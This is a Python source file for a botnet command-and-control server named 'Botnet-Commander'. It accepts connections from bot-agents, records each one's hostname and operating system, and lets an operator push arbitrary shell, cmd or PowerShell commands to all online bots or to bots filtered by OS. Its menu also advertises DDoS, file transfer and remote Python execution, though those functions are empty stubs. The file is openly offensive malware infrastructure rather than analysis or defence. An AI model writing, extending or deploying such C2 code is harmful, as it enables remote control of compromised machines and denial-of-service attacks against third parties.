import os
import json
import asyncio
from pathlib import Path
import configparser
from logger import CoreLogger
from socket import socket, AF_INET, SOCK_STREAM


def load_conf():
    config_parser = configparser.ConfigParser()
    cwd_path = Path(__file__)
    root_dir = cwd_path.parent.absolute()
    try:
        config_path = os.path.join(root_dir, "cfg/commander.ini")
        config_parser.read(config_path)
        host = config_parser.get("CORE", "HOST")
        port = int(config_parser.get("CORE", "PORT"))
        log_level = int(config_parser.get("CORE", "LOG_LEVEL"))
        log_dir = config_parser.get("CORE", "LOG_DIR")
        log_name = config_parser.get("CORE", "LOG_NAME")
        conn_buff = int(config_parser.get("CORE", "CONN_BUFF"))
        offline_tout = int(config_parser.get("CORE", "OFFLINE_TOUT"))
    except Exception as err:
        print("Error initializing CORE, Commander not started because config file could not be loaded. Unexpected "
              "exception occurred: {}".format(err))
        exit(5)
    return host, port, log_level, log_dir, log_name, conn_buff, offline_tout


class BotCommander:
    def __init__(self, host, port, conn_rcv, offline_tout):
        self.uuids = {}
        self.host = host
        self.port = port
        self.conn_rcv = conn_rcv
        self.offline_tout = offline_tout
        self.sock = socket(AF_INET, SOCK_STREAM)
        loop = asyncio.new_event_loop()
        loop.create_task(self.__process_user_input())
        loop.create_task(self.__server_run())
        loop.run_forever()

    @staticmethod
    def __print_help():
        print('''
        Welcome to Commander CLI!
        The following options are available:
        1) Execute shell/cmd commands
        2) Execute python script
        3) Download File
        4) Upload File
        5) Perform DDOS attack         
        ''')

    @staticmethod
    def __print_cmd_options():
        print("""
        The following options are available:
        1) Windows command - cmd/powershell
        2) Linux command - shell
        3) MacOS command - shell
        4) Generic command - command that can be processed by both Windows and Linux OS
        NOTE: If you choose 3 the command will be sent to all online bot-agents, if not it will be sent
        only to those online bot-agents running on the chosen OS type command
        """)

    @staticmethod
    def __get_user_input(message):
        return input(f"{message}")

    async def __process_user_input(self):
        self.__print_help()
        while True:
            val = 0
            msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3, 4 or 5: "
            choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
            try:
                val = int(choice)
            except ValueError:
                print("You have not inserted a digit, please insert a digit.")
            except Exception as err:
                print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
                      f" This is the error: {err}")
            match val:
                case 1:
                    self.__print_cmd_options()
                    await self.__exec_shell_cmd()
                case 2:
                    self.__exec_python_script()
                case 3:
                    pass
                case 4:
                    pass
                case 5:
                    self.__perform_ddos()
                case _:
                    print("Please insert a digit corresponding to one of the available options, 1, 2, 3, 4 or 5")

    async def __exec_shell_cmd(self):
        msg = "Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4: "
        choice = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
        try:
            val = int(choice)
        except ValueError:
            print("You have not inserted a digit, please insert a digit.")
            await self.__exec_shell_cmd()
        except Exception as err:
            print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
                  f" This is the error: {err}")
            await self.__exec_shell_cmd()
        match val:
            case 1:
                cmd_filter = "Windows"
            case 2:
                cmd_filter = "Linux"
            case 3:
                cmd_filter = "Darwin"
            case 4:
                cmd_filter = ""
            case _:
                print("Please insert a digit corresponding to one of the available options, 1, 2, 3 or 4")
                self.__print_cmd_options()
                await self.__exec_shell_cmd()
        print("NOTE: There is no validation performed by commander in regards to your command, so insert a valid one,"
              " if you insert an invalid one however you will just get the output and error for that command sent"
              "back by bot-agent, this note is just FYI.")
        msg = "Please insert the command you want to send to bot-agents: "
        cmd = await asyncio.get_running_loop().run_in_executor(None, self.__get_user_input, msg)
        if cmd:
            await self.__schedule_command(cmd, cmd_filter)
        else:
            print("You need to insert something. Starting over")
            self.__print_cmd_options()
            await self.__exec_shell_cmd()

    async def __schedule_command(self, payload, cmd_filter):
        if cmd_filter:
            for uuid in self.uuids:
                if self.uuids[uuid].get("online") and self.uuids[uuid].get("os") == cmd_filter:
                    await asyncio.wait_for(self.__send_cmd_to_bot_agent(uuid, payload), timeout=60)
        else:
            for uuid in self.uuids:
                if self.uuids[uuid].get("online"):
                    await asyncio.wait_for(self.__send_cmd_to_bot_agent(uuid, payload), timeout=60)

    async def __send_cmd_to_bot_agent(self, uuid, payload):
        try:
            logger.core.debug(f'Sending payload {payload} to bot-agent {self.uuids[uuid]["hostname"]}:'
                              f'{self.uuids[uuid]["addr"]}')
            self.uuids[uuid]["writer"].write(payload.encode("utf-8"))
        except Exception as err:
            logger.core.error(f'Unexpected exception when writing stream {payload} to bot-agent'
                              f' {self.uuids[uuid]["hostname"]}:{self.uuids[uuid]["addr"]} - {err}')

    def __exec_python_script(self):
        pass

    def __perform_ddos(self):
        pass

    async def __read_buffer(self, reader, addr):
        buffer = await self.__read_initial(reader, addr)
        if not buffer:
            return False
        logger.core.debug(f"Incoming input stream {buffer} from bot-agent {addr}")
        buffering = True
        data_list = []
        while buffering:
            if b"\n" in buffer:
                (line, buffer) = buffer.split(b"\n", 1)
                data_list.append(line)
            else:
                logger.core.debug(f"Received {data_list} from bot-agent {addr} so far, waiting for more data")
                more_data = await reader.read(self.conn_rcv)
                logger.core.debug(f"Received more data {more_data} from bot-agent {addr}")
                if not more_data:
                    buffering = False
                else:
                    buffer += more_data
        return data_list

    async def __read_initial(self, reader, addr):
        try:
            buffer = await asyncio.wait_for(reader.read(self.conn_rcv), timeout=self.offline_tout)
        except TimeoutError:
            logger.core.error(f"Timeout exceeded for bot-agent {addr}, no input stream received in the"
                              f"last 200 seconds, setting bot-agent to offline, closing connection")
            return False
        except Exception as err:
            logger.core.error(f"Unexpected exception when reading input stream from bot-agent {addr}: {err},"
                              f" setting bot-agent to offline, closing connection")
            return False
        return buffer

    async def __communicate_with_agent(self, reader, writer, addr, uuid):
        while True:
            data = await self.__read_buffer(reader, addr)
            if data:
                for json_item in data:
                    if self.__process_input_stream(json_item, addr, reader, writer, uuid):
                        continue
                    else:
                        logger.core.error(f"Processing input stream from bot-agent {uuid}-{addr} has failed. Closing "
                                          f"connection and setting agent to offline")
                        self.uuids[uuid]["online"] = False
                        writer.close()
                        return
            else:
                logger.core.error(f"EOF received reading input stream from bot-agent {uuid}-{addr}. Closing connection "
                                  f"and setting agent to offline")
                self.uuids[uuid]["online"] = False
                writer.close()
                return

    async def __handle_agent(self, reader, writer):
        addr = writer.get_extra_info('peername')
        logger.core.info(f"Connection accepted from peer {addr}")
        agent_uuid = await self.__add_agent(reader, writer, addr)
        if not agent_uuid:
            return
        asyncio.create_task(self.__communicate_with_agent(reader, writer, addr, agent_uuid))

    async def __add_agent(self, reader, writer, addr):
        data = await self.__read_buffer(reader, addr)
        if data:
            for json_item in data:
                agent_uuid = self.__process_input_stream(json_item, addr, reader, writer)
                if agent_uuid:
                    hostname = self.uuids[agent_uuid].get("hostname")
                    payload = self.__json_builder("botHostInfoReply", hostname)
                    if payload:
                        try:
                            logger.core.debug(f'Sending botHostInfoReply to bot-agent {hostname}-{addr}')
                            writer.write(payload)
                        except Exception as err:
                            logger.core.error(f'Unexpected error when sending botHostInfoReply to bot-agent '
                                              f'{hostname}-{addr}: {err}. Closing connection, set agent to offline.')
                            writer.close()
                            self.uuids.get(agent_uuid)["online"] = False
                            return
                        return agent_uuid
                    else:
                        logger.core.error(f"Closing connection of bot-agent {hostname}:{addr} as adding process was"
                                          f" not successfully completed. Closing connection, set agent to offline")
                        writer.close()
                        self.uuids.get(agent_uuid)["online"] = False
                        return
                else:
                    logger.core.error(f"Decoding of getHostInfoReply from peer {addr} has failed, failed to add"
                                      f"bot-agent, closing connection")
                    writer.close()
                    return
        else:
            logger.core.info(f"Closing connection to peer {addr}")
            writer.close()
            return

    def __process_input_stream(self, json_item, addr, reader, writer, uuid_in=None):
        logger.core.debug(f"Deserializing {json_item} received from bot-agent {addr}-{uuid_in}")
        json_msg = self.__json_deserialize(json_item, addr)
        if not json_msg:
            return False
        message = json_msg.get("message")
        match message:
            case "botHostInfo":
                uuid = json_msg.get("uuid")
                if uuid in self.uuids:
                    logger.core.debug(f'Agent {addr} with UUID {uuid} already present in DB. Its hostname is '
                                      f'{self.uuids[uuid].get("hostname")})')
                    return uuid
                else:
                    hostname = json_msg.get("hostname")
                    op_sys = json_msg.get("os")
                    self.uuids[uuid] = {"hostname": hostname, "addr": addr, "online": True, "os": op_sys,
                                        "reader": reader, "writer": writer}
                    logger.core.debug(f"Successfully added agent {hostname}-{uuid} to DB")
                    return uuid
            case "botHello":
                payload = self.__json_builder("botHelloReply", self.uuids[uuid_in].get("hostname"))
                if payload:
                    try:
                        logger.core.debug(f"Sending botHelloReply to bot-agent {uuid_in}-{addr}")
                        writer.write(payload)
                    except Exception as err:
                        logger.core.error(f"Unexpected exception sending botHelloReply to bot-agent {uuid_in}-{addr}: {err}")
                        return False
                    return True
                else:
                    return False
            case "exeCommandReply":
                pass
            case "putFileReply":
                pass
            case "getFileReply":
                pass
            case _:
                logger.core.error(f"Processing of message received from bot-agent {addr} has failed, unknown message: "
                                  f"{message}, commander cannot interpret this. Closing connection ")
                return False

    @staticmethod
    def __json_deserialize(data, addr):
        try:
            json_item = json.loads(data.decode("utf-8"))
        except Exception as err:
            logger.core.error(f"Unexpected error when decoding getHostInfoReply from bot-agent {addr}: {err}.")
            return False
        return json_item

    @staticmethod
    def __json_serialize(data, message, hostname):
        try:
            payload = (json.dumps(data) + "\n").encode("utf-8")
        except Exception as err:
            logger.core.error(f"Unexpected error while serializing {message} message for bot-agent {hostname}: {err}")
            return False
        return payload

    def __json_builder(self, message, hostname):
        d = {"message": f"{message}"}
        match message:
            case "botHostInfoReply":
                payload = self.__json_serialize(d, message, hostname)
            case "botHelloReply":
                payload = self.__json_serialize(d, message, hostname)
            case _:
                logger.core.error(f"Json builder was not able ot match any known reply to send to bot-agent {hostname}")
                return False
        return payload

    @staticmethod
    def __safe_dict_double_get(d, key_1, key_2):
        try:
            return d.get(key_1).get(key_2)
        except AttributeError:
            logger.core.error(f"Commander failed to fetch {key_2} for bot-agent with UUID {key_1} because this UUID"
                              f"does not exist in DB")
        except Exception as err:
            logger.core.error(f"Unexpected error when commander tried to fetch {key_2} for bot-agent with UUID {key_1}: {err}")

    async def __server_run(self):
        server = await asyncio.start_server(self.__handle_agent, self.host, self.port)

        addrs = ", ".join(str(self.sock.getsockname()) for self.sock in server.sockets)
        logger.core.info(f"Server started listener on {addrs}")

        async with server:
            await server.serve_forever()


if __name__ == "__main__":
    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, CONN_BUFF, OFFLINE_TOUT = load_conf()
    logger = CoreLogger(LOG_LEVEL, LOG_DIR, LOG_NAME)
    srv = BotCommander(HOST, PORT, CONN_BUFF, OFFLINE_TOUT)
    logger.core.info("Botnet-Commander exited")
